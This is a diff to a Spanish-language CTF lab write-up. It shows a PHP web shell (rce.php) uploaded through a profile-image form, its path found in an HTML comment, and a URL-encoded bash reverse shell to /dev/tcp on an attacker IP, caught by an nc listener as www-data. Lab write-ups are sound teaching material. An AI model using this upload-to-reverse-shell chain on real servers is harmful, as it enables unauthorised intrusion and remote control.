@@ -166,7 +166,7 @@ Entramos en el apartado profile donde nos deja subir una imagen para nuestro per
   	?>
 
 
-Tras subir el fichero rce.php obtenemos un Response 200 OK 
+Tras subir el fichero rce.php obtenemos un Response 200 OK
 
 	HTTP/1.1 200 OK
 	Date: Mon, 31 Jul 2023 18:15:38 GMT
@@ -180,10 +180,36 @@ Tras subir el fichero rce.php obtenemos un Response 200 OK
 	Content-Type: text/html; charset=UTF-8
 	
 	Image saved.<!DOCTYPE html>	
+---
+Problema: No sabemos en que ruta se almacena el fichero que acabamos de subir.
+---
+
+Despues de un buen rato buscando encontramos una url comentada en el codigo de la Respuesta que nos da el servidor cuando subimos una imagen para nuestro profile.
+
+![image](https://github.com/Esevka/CTF/assets/139042999/d9e15b42-55db-4cdb-8d59-501a5978fe7b)
+
+Bingo en esa url se encuentra nuestro rce.php desde el cual podemos ejecutar comandos en la maquina victima.
+![image](https://github.com/Esevka/CTF/assets/139042999/3ff53da0-1c68-46ab-b8fe-8b9f5ac81ae6)
 
 
-    
+## Obtenemos Reverse Shell
 
+Url que nos permite obtener una reverse shell en la maquina victima, para que funcione la shell debe estar url encodeada para que los caracteres no den problemas.
+
+	http://10.10.121.4/v2/profileimages/rce.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.18.54.226%2F1988%200%3E%261'
+
+Nos ponemos en escucha en nuestra maquina y ejecutamos la url anterior.
+
+	┌──(root㉿kali)-[/home/kali/Desktop/ctf/road]
+	└─# nc -lnvp 1988                                     
+	listening on [any] 1988 ...
+	connect to [10.18.54.226] from (UNKNOWN) [10.10.121.4] 52740
+	bash: cannot set terminal process group (561): Inappropriate ioctl for device
+	bash: no job control in this shell
+	www-data@sky:/var/www/html/v2/profileimages$ id
+	id
+	uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	www-data@sky:/var/www/html/v2/profileimages$ 
 
   
 
